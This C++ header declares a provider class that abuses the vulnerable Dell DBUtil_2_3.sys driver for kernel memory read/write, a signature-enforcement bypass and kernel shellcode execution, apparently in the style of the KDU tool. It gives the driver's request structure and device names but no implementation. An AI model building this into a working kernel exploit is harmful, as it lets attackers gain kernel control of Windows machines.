/**
 * @file DBUtilProvider.h
 * @author Gregory King
 * @date August 14, 2025
 * @brief This file contains the declaration of the DBUtilProvider class.
 *
 * The DBUtilProvider class is a concrete implementation of the IProvider
 * interface for the vulnerable Dell DBUtil_2_3.sys driver. It handles
 * loading, communicating with, and unloading the driver to perform
 * kernel memory operations.
 */

#pragma once

#include "IProvider.h"
#include <string>
#include <Windows.h>

namespace KernelMode {
    namespace Providers {
        /**
         * @class DBUtilProvider
         * @brief Implements the IProvider interface for the DBUtil_2_3.sys driver.
         *
         * This class uses the arbitrary memory read/write vulnerability in
         * DBUtil_2_3.sys to achieve kernel memory primitives.
         */
        class DBUtilProvider : public IProvider {
        public:
            DBUtilProvider();
            ~DBUtilProvider() override;

            bool Initialize(ULONG driverId = 0, bool bypassDSE = false) override;
            void Deinitialize() override;
            std::wstring GetProviderName() const override;

            bool ReadKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool WriteKernelMemory(uintptr_t address, void* buffer, size_t size) override;
            bool ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) override;
            bool BypassDSE() override;
            ULONG GetCapabilities() const override;
            const ProviderLoadData* GetLoadData() const override;
            uintptr_t VirtualToPhysical(uintptr_t virtualAddress) override;
            uintptr_t AllocateKernelMemory(size_t size, uintptr_t* physicalAddress = nullptr) override;
            bool FreeKernelMemory(uintptr_t virtualAddress, size_t size) override;
            bool CreateSystemThread(uintptr_t startAddress, uintptr_t parameter = 0) override;

            // Enhanced status-returning methods for better error handling
            ProviderStatus ReadKernelMemoryEx(uintptr_t address, void* buffer, size_t size);
            ProviderStatus WriteKernelMemoryEx(uintptr_t address, void* buffer, size_t size);
            ProviderStatus AllocateKernelMemoryEx(size_t size, uintptr_t* virtualAddress, uintptr_t* physicalAddress = nullptr);
            ProviderStatus ExecuteKernelShellcodeEx(const void* shellcode, size_t size, uintptr_t* resultAddress = nullptr);

            // Driver validation methods like KDU
            bool IsVulnerableDriverLoaded() const;
            bool ValidateDriverState() const;

            // KDU-style shellcode execution parameters
            struct ShellcodeExecutionParams {
                const void* Shellcode;              // Pointer to shellcode buffer
                size_t Size;                        // Size of shellcode in bytes
                bool AllocateMemory;                // Whether to allocate new memory or use provided address
                uintptr_t TargetAddress;            // Target address (if AllocateMemory is false)
                bool CreateThread;                  // Whether to create a system thread for execution
                bool WaitForCompletion;             // Whether to wait for thread completion
                DWORD TimeoutMs;                    // Timeout in milliseconds for thread wait
                uintptr_t Parameter;                // Optional parameter to pass to shellcode
                bool FreeMemoryOnCompletion;        // Whether to free allocated memory when done
            };

            // Enhanced shellcode execution with KDU-style parameters
            ProviderStatus ExecuteShellcodeEx(const ShellcodeExecutionParams& params, uintptr_t* resultAddress = nullptr);

        private:
            /**
             * @struct DBUTIL_READWRITE_REQUEST
             * @brief Authentic KDU structure for Dell DBUtil driver communication.
             * 
             * This is the exact structure used by KDU for Dell DBUtil_2_3.sys driver.
             * Size of data to read/write calculated as:
             * InputBufferSize - sizeof packet header 0x18 bytes length
             */
            typedef struct _DBUTIL_READWRITE_REQUEST {
                ULONG_PTR Unused;          // Always set to 0xDEADBEEF in KDU
                ULONG_PTR VirtualAddress;  // Target virtual address
                ULONG_PTR Offset;          // Always 0 in KDU implementation
                UCHAR Data[1];             // Variable length data (ANYSIZE_ARRAY)
            } DBUTIL_READWRITE_REQUEST, *PDBUTIL_READWRITE_REQUEST;

            /**
             * @brief Extracts the embedded driver resource to a temporary file.
             * @return True if extraction is successful, false otherwise.
             */
            bool DropDriver();

            /**
             * @brief Executes shellcode in kernel space using DBUtil vulnerability (KDU-style).
             * @param shellcode Pointer to shellcode buffer.
             * @param size Size of shellcode.
             * @return Return value from shellcode execution.
             */
            uintptr_t ExecuteKernelShellcode(BYTE* shellcode, size_t size);

            // KDU-style utility functions for authentic implementation
            
            /**
             * @brief Allocates locked memory using VirtualAllocEx + VirtualLock pattern from KDU.
             * @param Size Size of memory to allocate.
             * @param AllocationType Allocation type flags.
             * @param Protect Memory protection flags.
             * @return Pointer to allocated memory or nullptr on failure.
             */
            PVOID AllocateLockedMemory(SIZE_T Size, ULONG AllocationType, ULONG Protect);

            /**
             * @brief Frees locked memory using VirtualUnlock + VirtualFree pattern from KDU.
             * @param Memory Pointer to memory to free.
             * @param Size Size of memory to free.
             * @return TRUE on success, FALSE on failure.
             */
            BOOL FreeLockedMemory(PVOID Memory, SIZE_T Size);

            /**
             * @brief Calls driver using NtDeviceIoControlFile pattern from KDU.
             * @param DeviceHandle Handle to device.
             * @param IoControlCode IOCTL code.
             * @param InputBuffer Input buffer.
             * @param InputBufferLength Input buffer length.
             * @param OutputBuffer Output buffer.
             * @param OutputBufferLength Output buffer length.
             * @return TRUE on success, FALSE on failure.
             */
            BOOL CallDriver(HANDLE DeviceHandle, ULONG IoControlCode, PVOID InputBuffer, 
                          ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);

            /**
             * @brief Authentic KDU-style virtual memory read using DBUTIL_READWRITE_REQUEST.
             * @param DeviceHandle Handle to DBUtil device.
             * @param VirtualAddress Target virtual address.
             * @param Buffer Output buffer.
             * @param NumberOfBytes Number of bytes to read.
             * @return TRUE on success, FALSE on failure.
             */
            BOOL DbUtilReadVirtualMemory(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, 
                                       PVOID Buffer, ULONG NumberOfBytes);

            /**
             * @brief Authentic KDU-style virtual memory write using DBUTIL_READWRITE_REQUEST.
             * @param DeviceHandle Handle to DBUtil device.
             * @param VirtualAddress Target virtual address.
             * @param Buffer Input buffer.
             * @param NumberOfBytes Number of bytes to write.
             * @return TRUE on success, FALSE on failure.
             */
            BOOL DbUtilWriteVirtualMemory(HANDLE DeviceHandle, ULONG_PTR VirtualAddress, 
                                        PVOID Buffer, ULONG NumberOfBytes);

            HANDLE deviceHandle;
            SC_HANDLE serviceHandle;
            std::wstring driverPath;
            const std::wstring deviceName = L"\\DosDevices\\DBUtil_2_3";
            const std::wstring serviceName = L"DBUtil_2_3";
            const std::wstring driverFileName = L"DBUtil_2_3.sys";
        };
    }
}